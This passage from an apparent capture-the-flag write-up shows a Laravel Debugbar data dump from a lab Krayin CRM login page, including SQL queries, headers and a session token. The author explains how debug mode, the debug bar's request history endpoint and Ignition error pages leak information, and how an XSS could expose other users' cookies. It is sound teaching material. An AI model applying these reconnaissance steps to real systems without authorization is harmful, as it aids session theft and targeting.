                    "url": "phpstorm://open?file=%2Fvar%2Fwww%2Fkrayin%2Fpackages%2FWebkul%2FAdmin%2Fsrc%2FResources%2Fviews%2Fcomponents%2Fform%2Fcontrol-group%2Findex.blade.php&line=1",
                    "ajax": false,
                    "filename": "index.blade.php",
                    "line": "?"
                }
            },
            {
                "name": "admin::components.form.control-group.label",
                "param_count": null,
                "params": [],
                "start": 1788262648.789036,
                "type": "blade",
                "hash": "blade/var/www/krayin/packages/Webkul/Admin/src/Providers/../Resources/views/components/form/control-group/label.blade.phpadmin::components.form.control-group.label",
                "xdebug_link": {
                    "url": "phpstorm://open?file=%2Fvar%2Fwww%2Fkrayin%2Fpackages%2FWebkul%2FAdmin%2Fsrc%2FResources%2Fviews%2Fcomponents%2Fform%2Fcontrol-group%2Flabel.blade.php&line=1",
                    "ajax": false,
                    "filename": "label.blade.php",
                    "line": "?"
                }
            },
            {
                "name": "admin::components.form.control-group.control",
                "param_count": null,
                "params": [],
                "start": 1788262648.789181,
                "type": "blade",
                "hash": "blade/var/www/krayin/packages/Webkul/Admin/src/Providers/../Resources/views/components/form/control-group/control.blade.phpadmin::components.form.control-group.control",
                "xdebug_link": {
                    "url": "phpstorm://open?file=%2Fvar%2Fwww%2Fkrayin%2Fpackages%2FWebkul%2FAdmin%2Fsrc%2FResources%2Fviews%2Fcomponents%2Fform%2Fcontrol-group%2Fcontrol.blade.php&line=1",
                    "ajax": false,
                    "filename": "control.blade.php",
                    "line": "?"
                }
            },
            {
                "name": "admin::components.form.control-group.error",
                "param_count": null,
                "params": [],
                "start": 1788262648.789323,
                "type": "blade",
                "hash": "blade/var/www/krayin/packages/Webkul/Admin/src/Providers/../Resources/views/components/form/control-group/error.blade.phpadmin::components.form.control-group.error",
                "xdebug_link": {
                    "url": "phpstorm://open?file=%2Fvar%2Fwww%2Fkrayin%2Fpackages%2FWebkul%2FAdmin%2Fsrc%2FResources%2Fviews%2Fcomponents%2Fform%2Fcontrol-group%2Ferror.blade.php&line=1",
                    "ajax": false,
                    "filename": "error.blade.php",
                    "line": "?"
                }
            },
            {
                "name": "admin::components.form.control-group.index",
                "param_count": null,
                "params": [],
                "start": 1788262648.789432,
                "type": "blade",
                "hash": "blade/var/www/krayin/packages/Webkul/Admin/src/Providers/../Resources/views/components/form/control-group/index.blade.phpadmin::components.form.control-group.index",
                "xdebug_link": {
                    "url": "phpstorm://open?file=%2Fvar%2Fwww%2Fkrayin%2Fpackages%2FWebkul%2FAdmin%2Fsrc%2FResources%2Fviews%2Fcomponents%2Fform%2Fcontrol-group%2Findex.blade.php&line=1",
                    "ajax": false,
                    "filename": "index.blade.php",
                    "line": "?"
                }
            },
            {
                "name": "admin::components.form.index",
                "param_count": null,
                "params": [],
                "start": 1788262648.789656,
                "type": "blade",
                "hash": "blade/var/www/krayin/packages/Webkul/Admin/src/Providers/../Resources/views/components/form/index.blade.phpadmin::components.form.index",
                "xdebug_link": {
                    "url": "phpstorm://open?file=%2Fvar%2Fwww%2Fkrayin%2Fpackages%2FWebkul%2FAdmin%2Fsrc%2FResources%2Fviews%2Fcomponents%2Fform%2Findex.blade.php&line=1",
                    "ajax": false,
                    "filename": "index.blade.php",
                    "line": "?"
                }
            },
            {
                "name": "admin::components.layouts.anonymous",
                "param_count": null,
                "params": [],
                "start": 1788262648.790089,
                "type": "blade",
                "hash": "blade/var/www/krayin/packages/Webkul/Admin/src/Providers/../Resources/views/components/layouts/anonymous.blade.phpadmin::components.layouts.anonymous",
                "xdebug_link": {
                    "url": "phpstorm://open?file=%2Fvar%2Fwww%2Fkrayin%2Fpackages%2FWebkul%2FAdmin%2Fsrc%2FResources%2Fviews%2Fcomponents%2Flayouts%2Fanonymous.blade.php&line=1",
                    "ajax": false,
                    "filename": "anonymous.blade.php",
                    "line": "?"
                }
            },
            {
                "name": "admin::components.flash-group.index",
                "param_count": null,
                "params": [],
                "start": 1788262648.795254,
                "type": "blade",
                "hash": "blade/var/www/krayin/packages/Webkul/Admin/src/Providers/../Resources/views/components/flash-group/index.blade.phpadmin::components.flash-group.index",
                "xdebug_link": {
                    "url": "phpstorm://open?file=%2Fvar%2Fwww%2Fkrayin%2Fpackages%2FWebkul%2FAdmin%2Fsrc%2FResources%2Fviews%2Fcomponents%2Fflash-group%2Findex.blade.php&line=1",
                    "ajax": false,
                    "filename": "index.blade.php",
                    "line": "?"
                }
            },
            {
                "name": "admin::components.flash-group.item",
                "param_count": null,
                "params": [],
                "start": 1788262648.795664,
                "type": "blade",
                "hash": "blade/var/www/krayin/packages/Webkul/Admin/src/Providers/../Resources/views/components/flash-group/item.blade.phpadmin::components.flash-group.item",
                "xdebug_link": {
                    "url": "phpstorm://open?file=%2Fvar%2Fwww%2Fkrayin%2Fpackages%2FWebkul%2FAdmin%2Fsrc%2FResources%2Fviews%2Fcomponents%2Fflash-group%2Fitem.blade.php&line=1",
                    "ajax": false,
                    "filename": "item.blade.php",
                    "line": "?"
                }
            }
        ]
    },
    "queries": {
        "count": 7,
        "nb_statements": 6,
        "nb_visible_statements": 7,
        "nb_excluded_statements": 0,
        "nb_failed_statements": 0,
        "accumulated_duration": 0.0055,
        "accumulated_duration_str": "5.5ms",
        "memory_usage": 0,
        "memory_usage_str": null,
        "statements": [
            {
                "sql": "Connection Established",
                "type": "transaction",
                "params": [],
                "bindings": [],
                "hints": null,
                "show_copy": false,
                "backtrace": [
                    {
                        "index": 14,
                        "namespace": null,
                        "name": "vendor/prettus/l5-repository/src/Prettus/Repository/Eloquent/BaseRepository.php",
                        "file": "/var/www/krayin/vendor/prettus/l5-repository/src/Prettus/Repository/Eloquent/BaseRepository.php",
                        "line": 1152
                    },
                    {
                        "index": 15,
                        "namespace": null,
                        "name": "vendor/prettus/l5-repository/src/Prettus/Repository/Eloquent/BaseRepository.php",
                        "file": "/var/www/krayin/vendor/prettus/l5-repository/src/Prettus/Repository/Eloquent/BaseRepository.php",
                        "line": 557
                    },
                    {
                        "index": 16,
                        "namespace": null,
                        "name": "vendor/prettus/l5-repository/src/Prettus/Repository/Traits/CacheableRepository.php",
                        "file": "/var/www/krayin/vendor/prettus/l5-repository/src/Prettus/Repository/Traits/CacheableRepository.php",
                        "line": 315
                    },
                    {
                        "index": 17,
                        "namespace": null,
                        "name": "packages/Webkul/Core/src/Eloquent/Repository.php",
                        "file": "/var/www/krayin/packages/Webkul/Core/src/Eloquent/Repository.php",
                        "line": 38
                    },
                    {
                        "index": 18,
                        "namespace": null,
                        "name": "packages/Webkul/Core/src/SystemConfig.php",
                        "file": "/var/www/krayin/packages/Webkul/Core/src/SystemConfig.php",
                        "line": 178
                    }
                ],
                "start": 1788262648.778299,
                "duration": 0,
                "duration_str": "",
                "slow": false,
                "memory": 0,
                "memory_str": null,
                "filename": "BaseRepository.php:1152",
                "source": {
                    "index": 14,
                    "namespace": null,
                    "name": "vendor/prettus/l5-repository/src/Prettus/Repository/Eloquent/BaseRepository.php",
                    "file": "/var/www/krayin/vendor/prettus/l5-repository/src/Prettus/Repository/Eloquent/BaseRepository.php",
                    "line": 1152
                },
                "xdebug_link": {
                    "url": "phpstorm://open?file=%2Fvar%2Fwww%2Fkrayin%2Fvendor%2Fprettus%2Fl5-repository%2Fsrc%2FPrettus%2FRepository%2FEloquent%2FBaseRepository.php&line=1152",
                    "ajax": false,
                    "filename": "BaseRepository.php",
                    "line": "1152"
                },
                "connection": "krayin",
                "explain": null,
                "start_percent": 0,
                "width_percent": 0
            },
            {
                "sql": "select * from `core_config` where `code` = 'general.general.locale_settings.locale'",
                "type": "query",
                "params": [],
                "bindings": [
                    "general.general.locale_settings.locale"
                ],
                "hints": null,
                "show_copy": true,
                "backtrace": [
                    {
                        "index": 15,
                        "namespace": null,
                        "name": "vendor/prettus/l5-repository/src/Prettus/Repository/Eloquent/BaseRepository.php",
                        "file": "/var/www/krayin/vendor/prettus/l5-repository/src/Prettus/Repository/Eloquent/BaseRepository.php",
                        "line": 559
                    },
                    {
                        "index": 16,
                        "namespace": null,
                        "name": "vendor/prettus/l5-repository/src/Prettus/Repository/Traits/CacheableRepository.php",
                        "file": "/var/www/krayin/vendor/prettus/l5-repository/src/Prettus/Repository/Traits/CacheableRepository.php",
                        "line": 315
                    },
                    {
                        "index": 17,
                        "namespace": null,
                        "name": "packages/Webkul/Core/src/Eloquent/Repository.php",
                        "file": "/var/www/krayin/packages/Webkul/Core/src/Eloquent/Repository.php",
                        "line": 38
                    },
                    {
                        "index": 18,
                        "namespace": null,
                        "name": "packages/Webkul/Core/src/SystemConfig.php",
                        "file": "/var/www/krayin/packages/Webkul/Core/src/SystemConfig.php",
                        "line": 178
                    },
                    {
                        "index": 19,
                        "namespace": null,
                        "name": "packages/Webkul/Core/src/Core.php",
                        "file": "/var/www/krayin/packages/Webkul/Core/src/Core.php",
                        "line": 242
                    }
                ],
                "start": 1788262648.778707,
                "duration": 0.00276,
                "duration_str": "2.76ms",
                "slow": false,
                "memory": 0,
                "memory_str": null,
                "filename": "BaseRepository.php:559",
                "source": {
                    "index": 15,
                    "namespace": null,
                    "name": "vendor/prettus/l5-repository/src/Prettus/Repository/Eloquent/BaseRepository.php",
                    "file": "/var/www/krayin/vendor/prettus/l5-repository/src/Prettus/Repository/Eloquent/BaseRepository.php",
                    "line": 559
                },
                "xdebug_link": {
                    "url": "phpstorm://open?file=%2Fvar%2Fwww%2Fkrayin%2Fvendor%2Fprettus%2Fl5-repository%2Fsrc%2FPrettus%2FRepository%2FEloquent%2FBaseRepository.php&line=559",
                    "ajax": false,
                    "filename": "BaseRepository.php",
                    "line": "559"
                },
                "connection": "krayin",
                "explain": null,
                "start_percent": 0,
                "width_percent": 50.182
            },
            {
                "sql": "select * from `core_config` where `code` = 'general.design.admin_logo.logo_image'",
                "type": "query",
                "params": [],
                "bindings": [
                    "general.design.admin_logo.logo_image"
                ],
                "hints": null,
                "show_copy": true,
                "backtrace": [
                    {
                        "index": 15,
                        "namespace": null,
                        "name": "vendor/prettus/l5-repository/src/Prettus/Repository/Eloquent/BaseRepository.php",
                        "file": "/var/www/krayin/vendor/prettus/l5-repository/src/Prettus/Repository/Eloquent/BaseRepository.php",
                        "line": 559
                    },
                    {
                        "index": 16,
                        "namespace": null,
                        "name": "vendor/prettus/l5-repository/src/Prettus/Repository/Traits/CacheableRepository.php",
                        "file": "/var/www/krayin/vendor/prettus/l5-repository/src/Prettus/Repository/Traits/CacheableRepository.php",
                        "line": 315
                    },
                    {
                        "index": 17,
                        "namespace": null,
                        "name": "packages/Webkul/Core/src/Eloquent/Repository.php",
                        "file": "/var/www/krayin/packages/Webkul/Core/src/Eloquent/Repository.php",
                        "line": 38
                    },
                    {
                        "index": 18,
                        "namespace": null,
                        "name": "packages/Webkul/Core/src/SystemConfig.php",
                        "file": "/var/www/krayin/packages/Webkul/Core/src/SystemConfig.php",
                        "line": 178
                    },
                    {
                        "index": 19,
                        "namespace": null,
                        "name": "packages/Webkul/Core/src/Core.php",
                        "file": "/var/www/krayin/packages/Webkul/Core/src/Core.php",
                        "line": 242
                    }
                ],
                "start": 1788262648.785805,
                "duration": 0.0005899999999999999,
                "duration_str": "590\u03bcs",
                "slow": false,
                "memory": 0,
                "memory_str": null,
                "filename": "BaseRepository.php:559",
                "source": {
                    "index": 15,
                    "namespace": null,
                    "name": "vendor/prettus/l5-repository/src/Prettus/Repository/Eloquent/BaseRepository.php",
                    "file": "/var/www/krayin/vendor/prettus/l5-repository/src/Prettus/Repository/Eloquent/BaseRepository.php",
                    "line": 559
                },
                "xdebug_link": {
                    "url": "phpstorm://open?file=%2Fvar%2Fwww%2Fkrayin%2Fvendor%2Fprettus%2Fl5-repository%2Fsrc%2FPrettus%2FRepository%2FEloquent%2FBaseRepository.php&line=559",
                    "ajax": false,
                    "filename": "BaseRepository.php",
                    "line": "559"
                },
                "connection": "krayin",
                "explain": null,
                "start_percent": 50.182,
                "width_percent": 10.727
            },
            {
                "sql": "select * from `core_config` where `code` = 'general.design.admin_logo.favicon'",
                "type": "query",
                "params": [],
                "bindings": [
                    "general.design.admin_logo.favicon"
                ],
                "hints": null,
                "show_copy": true,
                "backtrace": [
                    {
                        "index": 15,
                        "namespace": null,
                        "name": "vendor/prettus/l5-repository/src/Prettus/Repository/Eloquent/BaseRepository.php",
                        "file": "/var/www/krayin/vendor/prettus/l5-repository/src/Prettus/Repository/Eloquent/BaseRepository.php",
                        "line": 559
                    },
                    {
                        "index": 16,
                        "namespace": null,
                        "name": "vendor/prettus/l5-repository/src/Prettus/Repository/Traits/CacheableRepository.php",
                        "file": "/var/www/krayin/vendor/prettus/l5-repository/src/Prettus/Repository/Traits/CacheableRepository.php",
                        "line": 315
                    },
                    {
                        "index": 17,
                        "namespace": null,
                        "name": "packages/Webkul/Core/src/Eloquent/Repository.php",
                        "file": "/var/www/krayin/packages/Webkul/Core/src/Eloquent/Repository.php",
                        "line": 38
                    },
                    {
                        "index": 18,
                        "namespace": null,
                        "name": "packages/Webkul/Core/src/SystemConfig.php",
                        "file": "/var/www/krayin/packages/Webkul/Core/src/SystemConfig.php",
                        "line": 178
                    },
                    {
                        "index": 19,
                        "namespace": null,
                        "name": "packages/Webkul/Core/src/Core.php",
                        "file": "/var/www/krayin/packages/Webkul/Core/src/Core.php",
                        "line": 242
                    }
                ],
                "start": 1788262648.79083,
                "duration": 0.0007700000000000001,
                "duration_str": "770\u03bcs",
                "slow": false,
                "memory": 0,
                "memory_str": null,
                "filename": "BaseRepository.php:559",
                "source": {
                    "index": 15,
                    "namespace": null,
                    "name": "vendor/prettus/l5-repository/src/Prettus/Repository/Eloquent/BaseRepository.php",
                    "file": "/var/www/krayin/vendor/prettus/l5-repository/src/Prettus/Repository/Eloquent/BaseRepository.php",
                    "line": 559
                },
                "xdebug_link": {
                    "url": "phpstorm://open?file=%2Fvar%2Fwww%2Fkrayin%2Fvendor%2Fprettus%2Fl5-repository%2Fsrc%2FPrettus%2FRepository%2FEloquent%2FBaseRepository.php&line=559",
                    "ajax": false,
                    "filename": "BaseRepository.php",
                    "line": "559"
                },
                "connection": "krayin",
                "explain": null,
                "start_percent": 60.909,
                "width_percent": 14
            },
            {
                "sql": "select * from `core_config` where `code` = 'general.settings.menu_color.brand_color'",
                "type": "query",
                "params": [],
                "bindings": [
                    "general.settings.menu_color.brand_color"
                ],
                "hints": null,
                "show_copy": true,
                "backtrace": [
                    {
                        "index": 15,
                        "namespace": null,
                        "name": "vendor/prettus/l5-repository/src/Prettus/Repository/Eloquent/BaseRepository.php",
                        "file": "/var/www/krayin/vendor/prettus/l5-repository/src/Prettus/Repository/Eloquent/BaseRepository.php",
                        "line": 559
                    },
                    {
                        "index": 16,
                        "namespace": null,
                        "name": "vendor/prettus/l5-repository/src/Prettus/Repository/Traits/CacheableRepository.php",
                        "file": "/var/www/krayin/vendor/prettus/l5-repository/src/Prettus/Repository/Traits/CacheableRepository.php",
                        "line": 315
                    },
                    {
                        "index": 17,
                        "namespace": null,
                        "name": "packages/Webkul/Core/src/Eloquent/Repository.php",
                        "file": "/var/www/krayin/packages/Webkul/Core/src/Eloquent/Repository.php",
                        "line": 38
                    },
                    {
                        "index": 18,
                        "namespace": null,
                        "name": "packages/Webkul/Core/src/SystemConfig.php",
                        "file": "/var/www/krayin/packages/Webkul/Core/src/SystemConfig.php",
                        "line": 178
                    },
                    {
                        "index": 19,
                        "namespace": null,
                        "name": "packages/Webkul/Core/src/Core.php",
                        "file": "/var/www/krayin/packages/Webkul/Core/src/Core.php",
                        "line": 242
                    }
                ],
                "start": 1788262648.792855,
                "duration": 0.00047,
                "duration_str": "470\u03bcs",
                "slow": false,
                "memory": 0,
                "memory_str": null,
                "filename": "BaseRepository.php:559",
                "source": {
                    "index": 15,
                    "namespace": null,
                    "name": "vendor/prettus/l5-repository/src/Prettus/Repository/Eloquent/BaseRepository.php",
                    "file": "/var/www/krayin/vendor/prettus/l5-repository/src/Prettus/Repository/Eloquent/BaseRepository.php",
                    "line": 559
                },
                "xdebug_link": {
                    "url": "phpstorm://open?file=%2Fvar%2Fwww%2Fkrayin%2Fvendor%2Fprettus%2Fl5-repository%2Fsrc%2FPrettus%2FRepository%2FEloquent%2FBaseRepository.php&line=559",
                    "ajax": false,
                    "filename": "BaseRepository.php",
                    "line": "559"
                },
                "connection": "krayin",
                "explain": null,
                "start_percent": 74.909,
                "width_percent": 8.545
            },
            {
                "sql": "select * from `core_config` where `code` = 'general.content.custom_scripts.custom_css'",
                "type": "query",
                "params": [],
                "bindings": [
                    "general.content.custom_scripts.custom_css"
                ],
                "hints": null,
                "show_copy": true,
                "backtrace": [
                    {
                        "index": 15,
                        "namespace": null,
                        "name": "vendor/prettus/l5-repository/src/Prettus/Repository/Eloquent/BaseRepository.php",
                        "file": "/var/www/krayin/vendor/prettus/l5-repository/src/Prettus/Repository/Eloquent/BaseRepository.php",
                        "line": 559
                    },
                    {
                        "index": 16,
                        "namespace": null,
                        "name": "vendor/prettus/l5-repository/src/Prettus/Repository/Traits/CacheableRepository.php",
                        "file": "/var/www/krayin/vendor/prettus/l5-repository/src/Prettus/Repository/Traits/CacheableRepository.php",
                        "line": 315
                    },
                    {
                        "index": 17,
                        "namespace": null,
                        "name": "packages/Webkul/Core/src/Eloquent/Repository.php",
                        "file": "/var/www/krayin/packages/Webkul/Core/src/Eloquent/Repository.php",
                        "line": 38
                    },
                    {
                        "index": 18,
                        "namespace": null,
                        "name": "packages/Webkul/Core/src/SystemConfig.php",
                        "file": "/var/www/krayin/packages/Webkul/Core/src/SystemConfig.php",
                        "line": 178
                    },
                    {
                        "index": 19,
                        "namespace": null,
                        "name": "packages/Webkul/Core/src/Core.php",
                        "file": "/var/www/krayin/packages/Webkul/Core/src/Core.php",
                        "line": 242
                    }
                ],
                "start": 1788262648.794014,
                "duration": 0.00043,
                "duration_str": "430\u03bcs",
                "slow": false,
                "memory": 0,
                "memory_str": null,
                "filename": "BaseRepository.php:559",
                "source": {
                    "index": 15,
                    "namespace": null,
                    "name": "vendor/prettus/l5-repository/src/Prettus/Repository/Eloquent/BaseRepository.php",
                    "file": "/var/www/krayin/vendor/prettus/l5-repository/src/Prettus/Repository/Eloquent/BaseRepository.php",
                    "line": 559
                },
                "xdebug_link": {
                    "url": "phpstorm://open?file=%2Fvar%2Fwww%2Fkrayin%2Fvendor%2Fprettus%2Fl5-repository%2Fsrc%2FPrettus%2FRepository%2FEloquent%2FBaseRepository.php&line=559",
                    "ajax": false,
                    "filename": "BaseRepository.php",
                    "line": "559"
                },
                "connection": "krayin",
                "explain": null,
                "start_percent": 83.455,
                "width_percent": 7.818
            },
            {
                "sql": "select * from `core_config` where `code` = 'general.content.custom_scripts.custom_javascript'",
                "type": "query",
                "params": [],
                "bindings": [
                    "general.content.custom_scripts.custom_javascript"
                ],
                "hints": null,
                "show_copy": true,
                "backtrace": [
                    {
                        "index": 15,
                        "namespace": null,
                        "name": "vendor/prettus/l5-repository/src/Prettus/Repository/Eloquent/BaseRepository.php",
                        "file": "/var/www/krayin/vendor/prettus/l5-repository/src/Prettus/Repository/Eloquent/BaseRepository.php",
                        "line": 559
                    },
                    {
                        "index": 16,
                        "namespace": null,
                        "name": "vendor/prettus/l5-repository/src/Prettus/Repository/Traits/CacheableRepository.php",
                        "file": "/var/www/krayin/vendor/prettus/l5-repository/src/Prettus/Repository/Traits/CacheableRepository.php",
                        "line": 315
                    },
                    {
                        "index": 17,
                        "namespace": null,
                        "name": "packages/Webkul/Core/src/Eloquent/Repository.php",
                        "file": "/var/www/krayin/packages/Webkul/Core/src/Eloquent/Repository.php",
                        "line": 38
                    },
                    {
                        "index": 18,
                        "namespace": null,
                        "name": "packages/Webkul/Core/src/SystemConfig.php",
                        "file": "/var/www/krayin/packages/Webkul/Core/src/SystemConfig.php",
                        "line": 178
                    },
                    {
                        "index": 19,
                        "namespace": null,
                        "name": "packages/Webkul/Core/src/Core.php",
                        "file": "/var/www/krayin/packages/Webkul/Core/src/Core.php",
                        "line": 242
                    }
                ],
                "start": 1788262648.7962031,
                "duration": 0.00047999999999999996,
                "duration_str": "480\u03bcs",
                "slow": false,
                "memory": 0,
                "memory_str": null,
                "filename": "BaseRepository.php:559",
                "source": {
                    "index": 15,
                    "namespace": null,
                    "name": "vendor/prettus/l5-repository/src/Prettus/Repository/Eloquent/BaseRepository.php",
                    "file": "/var/www/krayin/vendor/prettus/l5-repository/src/Prettus/Repository/Eloquent/BaseRepository.php",
                    "line": 559
                },
                "xdebug_link": {
                    "url": "phpstorm://open?file=%2Fvar%2Fwww%2Fkrayin%2Fvendor%2Fprettus%2Fl5-repository%2Fsrc%2FPrettus%2FRepository%2FEloquent%2FBaseRepository.php&line=559",
                    "ajax": false,
                    "filename": "BaseRepository.php",
                    "line": "559"
                },
                "connection": "krayin",
                "explain": null,
                "start_percent": 91.273,
                "width_percent": 8.727
            }
        ]
    },
    "models": {
        "data": [],
        "count": 0,
        "key_map": {
            "retrieved": "Retrieved",
            "created": "Created",
            "updated": "Updated",
            "deleted": "Deleted"
        },
        "is_counter": true,
        "badges": []
    },
    "symfonymailer_mails": {
        "count": 0,
        "mails": []
    },
    "gate": {
        "count": 0,
        "messages": []
    },
    "request": {
        "data": {
            "status": "200 OK",
            "full_url": "http://billing.nexus.htb/admin/login",
            "action_name": "admin.session.create",
            "controller_action": "Webkul\\Admin\\Http\\Controllers\\User\\SessionController@create",
            "uri": "GET admin/login",
            "excluded_middleware": [
                "user"
            ],
            "controller": {
                "value": "Webkul\\Admin\\Http\\Controllers\\User\\SessionController@create",
                "xdebug_link": {
                    "url": "phpstorm://open?file=%2Fvar%2Fwww%2Fkrayin%2Fpackages%2FWebkul%2FAdmin%2Fsrc%2FHttp%2FControllers%2FUser%2FSessionController.php&line=16",
                    "ajax": false,
                    "filename": "SessionController.php",
                    "line": "16"
                }
            },
            "prefix": "admin/login",
            "file": {
                "value": "packages/Webkul/Admin/src/Http/Controllers/User/SessionController.php:16-31",
                "xdebug_link": {
                    "url": "phpstorm://open?file=%2Fvar%2Fwww%2Fkrayin%2Fpackages%2FWebkul%2FAdmin%2Fsrc%2FHttp%2FControllers%2FUser%2FSessionController.php&line=16",
                    "ajax": false,
                    "filename": "SessionController.php",
                    "line": "16"
                }
            },
            "middleware": "web, admin_locale, user",
            "duration": "81.43ms",
            "peak_memory": "4MB",
            "response": "text/html; charset=utf-8",
            "request_format": "html",
            "request_query": "<pre class=sf-dump id=sf-dump-607610276 data-indent-pad=\"  \">[]\n</pre><script>Sfdump(\"sf-dump-607610276\", {\"maxDepth\":0})</script>\n",
            "request_request": "<pre class=sf-dump id=sf-dump-182166094 data-indent-pad=\"  \">[]\n</pre><script>Sfdump(\"sf-dump-182166094\", {\"maxDepth\":0})</script>\n",
            "request_headers": "<pre class=sf-dump id=sf-dump-1180277431 data-indent-pad=\"  \"><span class=sf-dump-note>array:3</span> [<samp data-depth=1 class=sf-dump-expanded>\n  \"<span class=sf-dump-key>accept</span>\" => <span class=sf-dump-note>array:1</span> [<samp data-depth=2 class=sf-dump-compact>\n    <span class=sf-dump-index>0</span> => \"<span class=sf-dump-str title=\"3 characters\">*/*</span>\"\n  </samp>]\n  \"<span class=sf-dump-key>user-agent</span>\" => <span class=sf-dump-note>array:1</span> [<samp data-depth=2 class=sf-dump-compact>\n    <span class=sf-dump-index>0</span> => \"<span class=sf-dump-str title=\"10 characters\">curl/8.5.0</span>\"\n  </samp>]\n  \"<span class=sf-dump-key>host</span>\" => <span class=sf-dump-note>array:1</span> [<samp data-depth=2 class=sf-dump-compact>\n    <span class=sf-dump-index>0</span> => \"<span class=sf-dump-str title=\"17 characters\">billing.nexus.htb</span>\"\n  </samp>]\n</samp>]\n</pre><script>Sfdump(\"sf-dump-1180277431\", {\"maxDepth\":0})</script>\n",
            "request_cookies": "<pre class=sf-dump id=sf-dump-1167771306 data-indent-pad=\"  \">[]\n</pre><script>Sfdump(\"sf-dump-1167771306\", {\"maxDepth\":0})</script>\n",
            "response_headers": "<pre class=sf-dump id=sf-dump-653100894 data-indent-pad=\"  \"><span class=sf-dump-note>array:3</span> [<samp data-depth=1 class=sf-dump-expanded>\n  \"<span class=sf-dump-key>content-type</span>\" => <span class=sf-dump-note>array:1</span> [<samp data-depth=2 class=sf-dump-compact>\n    <span class=sf-dump-index>0</span> => \"<span class=sf-dump-str title=\"24 characters\">text/html; charset=utf-8</span>\"\n  </samp>]\n  \"<span class=sf-dump-key>cache-control</span>\" => <span class=sf-dump-note>array:1</span> [<samp data-depth=2 class=sf-dump-compact>\n    <span class=sf-dump-index>0</span> => \"<span class=sf-dump-str title=\"17 characters\">no-cache, private</span>\"\n  </samp>]\n  \"<span class=sf-dump-key>date</span>\" => <span class=sf-dump-note>array:1</span> [<samp data-depth=2 class=sf-dump-compact>\n    <span class=sf-dump-index>0</span> => \"<span class=sf-dump-str title=\"29 characters\">Tue, 01 Sep 2026 11:37:28 GMT</span>\"\n  </samp>]\n</samp>]\n</pre><script>Sfdump(\"sf-dump-653100894\", {\"maxDepth\":0})</script>\n",
            "session_attributes": "<pre class=sf-dump id=sf-dump-1982786913 data-indent-pad=\"  \"><span class=sf-dump-note>array:2</span> [<samp data-depth=1 class=sf-dump-expanded>\n  \"<span class=sf-dump-key>_token</span>\" => \"<span class=sf-dump-str title=\"40 characters\">YqUnocb5Gcd4Ml0YRMZCoSueeqtA9Dlj6LtLTXzA</span>\"\n  \"<span class=sf-dump-key>url</span>\" => <span class=sf-dump-note>array:1</span> [<samp data-depth=2 class=sf-dump-compact>\n    \"<span class=sf-dump-key>intended</span>\" => \"<span class=sf-dump-str title=\"40 characters\">http://billing.nexus.htb/admin/dashboard</span>\"\n  </samp>]\n</samp>]\n</pre><script>Sfdump(\"sf-dump-1982786913\", {\"maxDepth\":0})</script>\n"
        },
        "tooltip": {
            "status": "200 OK",
            "full_url": "http://billing.nexus.htb/admin/login",
            "action_name": "admin.session.create",
            "controller_action": "Webkul\\Admin\\Http\\Controllers\\User\\SessionController@create"
        },
        "badge": null
    }
}
```

For example, in there I can see SQL queries:

```json
"sql": "select * from `core_config` where `code` = 'general.general.locale_settings.locale'",
"sql": "select * from `core_config` where `code` = 'general.design.admin_logo.logo_image'",
"sql": "select * from `core_config` where `code` = 'general.design.admin_logo.favicon'",
"sql": "select * from `core_config` where `code` = 'general.settings.menu_color.brand_color'",
"sql": "select * from `core_config` where `code` = 'general.content.custom_scripts.custom_css'",
"sql": "select * from `core_config` where `code` = 'general.content.custom_scripts.custom_javascript'",
```

Once authenticated, the same dataset provides even more. I can see the decrypted user session attributes:

![image-20260901080600488](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/8ab62ead955e0850.png)

![image-20260901080600488](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260901080600488.webp)

This is just my session, but if I had an XSS, I could reflect back another user’s cookies and information.

There’s another feature of the Debug Bar, `/_debugbar/open` that will show every previously captured request, including from other users. On Nexus it’s disabled:

```typescript
oxdf@hacky$ curl -s http://billing.nexus.htb/_debugbar/open
[{"datetime":"...","id":null,"ip":"...","method":"ERROR","uri":"!! To enable public access to previous requests, set debugbar.storage.open to true in your config, or enable DEBUGBAR_OPEN_STORAGE if you did not publish the config. !!","utime":...}]
```

The other half is debug mode’s error pages. Any unhandled exception returns a full Ignition stack trace instead of a generic 500, and those pages leak the absolute application path and the exact framework versions.

None of this leads directly to RCE, but it could be useful in some cases.
